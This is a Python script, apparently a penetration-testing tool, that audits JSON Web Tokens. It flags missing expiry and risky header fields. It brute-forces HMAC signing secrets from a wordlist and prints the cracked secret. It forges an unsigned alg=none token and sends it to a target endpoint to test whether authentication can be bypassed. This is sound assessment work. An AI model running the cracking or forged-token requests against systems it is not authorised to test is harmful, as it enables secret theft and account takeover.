#!/usr/bin/env python3
"""Check JWTs for structural weaknesses, weak HMAC secrets, and none-alg."""

import argparse
import base64
import hashlib
import hmac
import json
import urllib.error
import urllib.request


def b64url_decode(segment):
  padding = "=" * (-len(segment) % 4)
  return base64.urlsafe_b64decode(segment + padding)


def b64url_encode(raw):
  return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def parse_token(token):
  parts = token.strip().split(".")
  if len(parts) != 3:
    raise SystemExit("token does not have 3 segments")
  header = json.loads(b64url_decode(parts[0]))
  payload = json.loads(b64url_decode(parts[1]))
  signature = b64url_decode(parts[2])
  return header, payload, signature, parts


def crack_hs256(parts, wordlist_path):
  signing_input = f"{parts[0]}.{parts[1]}".encode()
  with open(wordlist_path, encoding="utf-8") as handle:
    for line in handle:
      candidate = line.strip()
      if not candidate:
        continue
      digest = hmac.new(candidate.encode(), signing_input, hashlib.sha256).digest()
      if hmac.compare_digest(digest, b64url_decode(parts[2])):
        return candidate
  return None


def main():
  parser = argparse.ArgumentParser(description="Analyze a JWT for weak secrets and dangerous header fields.")
  parser.add_argument("token", help="JWT string (header.payload.signature)")
  parser.add_argument("--wordlist", help="wordlist to brute-force an HS256 secret")
  parser.add_argument("--endpoint", help="protected URL to test alg=none acceptance against")
  parser.add_argument("--cookie-name", default=None, help="send the token as this cookie instead of Authorization: Bearer")
  args = parser.parse_args()

  header, payload, _, parts = parse_token(args.token)
  print(f"[*] header : {json.dumps(header)}")
  print(f"[*] payload: {json.dumps(payload)[:200]}")

  findings = []
  alg = str(header.get("alg", ""))
  if "exp" not in payload:
    findings.append("no exp claim - token never expires")
  for danger_field in ("jku", "x5u", "jwk"):
    if danger_field in header:
      findings.append(f"{danger_field} header present ({header[danger_field]!r}) - key injection attacks may apply")
  kid = str(header.get("kid", ""))
  if ".." in kid or kid.startswith("/"):
    findings.append(f"kid looks path-like ({kid!r}) - path traversal key confusion may apply")

  cracked = None
  if args.wordlist and alg.upper() in ("HS256", "HS384", "HS512"):
    print(f"\n[*] cracking {alg} secret with {args.wordlist}...")
    cracked = crack_hs256(parts, args.wordlist)
    if cracked:
      masked = cracked[:3] + "*" * max(0, len(cracked) - 3)
      findings.append(f"HMAC secret cracked: {masked} (full: shown once here -> {cracked})")

  if args.endpoint:
    forged_header = {"alg": "none", "typ": "JWT"}
    forged = (
      b64url_encode(json.dumps(forged_header).encode())
      + "."
      + b64url_encode(json.dumps(payload).encode())
      + "."
    )
    headers = {"User-Agent": "security-assessment-scripts/1.0"}
    if args.cookie_name:
      headers["Cookie"] = f"{args.cookie_name}={forged}"
    else:
      headers["Authorization"] = f"Bearer {forged}"
    request = urllib.request.Request(args.endpoint, headers=headers)
    try:
      response = urllib.request.urlopen(request, timeout=10)
      status_none = getattr(response, "status", response.code)
      body_none = response.read(4096).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
      status_none = exc.code
      body_none = exc.read(4096).decode("utf-8", "replace")

    baseline_headers = dict(headers)
    baseline_headers["Authorization" if not args.cookie_name else "Cookie"] = (
      f"Bearer {args.token}" if not args.cookie_name else f"{args.cookie_name}={args.token}"
    )
    request = urllib.request.Request(args.endpoint, headers=baseline_headers)
    try:
      response = urllib.request.urlopen(request, timeout=10)
      status_orig = getattr(response, "status", response.code)
    except urllib.error.HTTPError as exc:
      status_orig = exc.code

    auth_error_markers = ("401", "unauthorized", "invalid token", "signature", "unauthorized", "login")
    looks_authed = status_none and 200 <= status_none < 300 and not any(
        marker in body_none.lower() for marker in ("invalid", "signature", "unauthorized"))
    flag = "[!]" if looks_authed else "[ ]"
    print(f"\n{flag} alg=none acceptance test: original token HTTP {status_orig}, forged none-token HTTP {status_none}")
    if looks_authed:
      findings.append("server accepted alg=none token (2xx response with authenticated-looking content)!")

  print()
  if findings:
    print("[!] JWT findings:")
    for finding in findings:
      print(f"    - {finding}")
  else:
    print("[+] No structural weaknesses detected; verify server-side verification behavior manually.")


if __name__ == "__main__":
  main()
